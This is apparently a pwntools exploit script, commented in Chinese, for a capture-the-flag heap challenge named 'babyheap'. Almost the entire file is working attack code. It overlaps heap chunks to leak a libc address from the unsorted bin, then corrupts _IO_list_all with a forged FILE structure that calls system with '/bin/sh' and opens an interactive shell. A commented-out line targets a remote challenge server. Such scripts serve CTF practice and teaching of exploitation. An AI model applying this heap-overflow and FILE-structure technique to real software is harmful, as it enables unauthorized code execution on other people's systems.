#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug = 0
elf_base=0x555555554000
context.terminal=["tmux","splitw","-h"]
#env={"LD_PREVLOAD":'./libc-2.23.so'}
a=process("./babyheap",env={"LD_PREVLOAD":"./libc.so.6"})
#a=remote("111.198.29.45","30373")
if debug:
    gdb.attach(a,'''
    b *0x7ffff7afd2a4
              ''')
#malloc , edit ,delete,b *(0x555555554000+0xDE3),b *(0x555555554000+0xE61)
    #b *(0x555555554000+0xFB0),b *(0x555555554000+0xc73)
elf=ELF("./babyheap")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def menu(index):
    a.recvuntil(">> ")
    a.sendline(str(index))

def create(size,content):
    menu(1)
    a.sendline(str(size))
    sleep(0.1)
    a.send(content)

def edit(index,size,content):
    menu(2)
    a.sendline(str(index))
    sleep(0.1)
    a.sendline(str(size))
    sleep(0.1)
    a.send(content)

def delete(index):
    menu(4)
    a.sendline(str(index))

def printf(index):
    menu(3)
    a.sendline(str(index))
#size < 0x400

create(0x10,"A"*16)    #0
create(0x200,'A'*0x200)#1  ,unsorted bin extend 
create(0x80,'A'*0x80)  #2
create(0x10,'A'*0x10)  #3,防止top chunk合并

delete(1)
edit(0,(0x10+8+8),'A'*16+p64(0x20)+p64(0x210+0x91)) #修改 chunk1的 size为0x2a1

payload="A"*0x200+p64(0x210)+p64(0x91)
payload=payload.ljust(0x2a0-0x10,"A")
create(0x2a0-0x10,payload) #1

delete(2)

edit(1,0x200+0x10,'A'*0x210)
printf(1)
a.recvuntil('A'*0x210)
unsorted_bin_addr=u64(a.recv(6).ljust(8,'\x00'))
libc_base=unsorted_bin_addr-88-libc.symbols["__malloc_hook"]-0x10

edit(1,0x200+16,'A'*0x200+p64(0x210)+p64(0x90))#恢复prev_size,size,防止报错。

success("libc_base ==> 0x%x"%libc_base)
#one_gadget=libc_base+0x45216 #0x4526a,0xf02a4,0xf1147
one_gadget=libc_base+libc.symbols["system"]
success("system ==> 0x%x"%one_gadget)
io_list_all=libc_base+libc.symbols["_IO_list_all"]

create(0x80,"A"*0x80)#2 将unsorted bin中的chunk拿出来,防止干扰。

create(0x10,'B'*16)    #4 overflow chunk
create(0x200,'A'*0x200)#5 unsorted bin attack，修改 _IO_list_all
create(0x10,'A'*16)    #6 防止合并
delete(5)

io_str_jumps=libc_base+0x3c37a0
sh_addr=libc_base+0x18cd57

aaa = 'A'*16
payload = p64(0)+p64(0x61)
payload += p64(0)+p64(io_list_all-0x10)
payload += p64(0)+p64(1)   #write_ptr >write_base
payload += p64(0)+p64(sh_addr) 
payload =payload.ljust(0xd8,'\x00')
payload += p64(io_str_jumps-8)
payload += p64(0)
payload += p64(one_gadget) # fd+0xe8

aaa+=payload 
edit(4,len(aaa),aaa)
'''
a.recv()
a.sendline("1")
sleep(0.1)
a.sendline("30")
'''
a.recv()
a.sendline("1")
raw_input("get???")
a.sendline("30")
a.interactive()
